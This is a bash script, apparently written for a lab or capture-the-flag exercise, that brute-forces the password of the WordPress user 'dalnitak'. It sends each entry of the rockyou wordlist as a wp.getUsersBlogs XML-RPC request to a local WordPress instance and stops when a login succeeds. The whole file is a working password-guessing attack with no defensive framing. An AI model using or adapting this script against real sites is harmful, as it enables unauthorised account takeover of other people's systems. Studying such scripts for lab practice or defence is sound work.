#!/bin/bash

function ctrl_c() {
  echo -e "\n\n[!] Saliendo..."
  exit 1
}

# Ctrl + c
trap ctrl_c SIGINT 

function createXML() {
  password=$1

  xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>dalnitak</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>"""

  echo $xmlFile > file.xml

  response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)

  if [ ! "$(echo $response | grep "Incorrect username or password.")" ] 
  then
    echo -e "\n[+] La contraseña para el usuario dalnitak es $password"
    exit 0
  fi
}

exec 3<"/usr/share/wordlists/rockyou.txt"

while read -u3 password
do 
  createXML $password
done
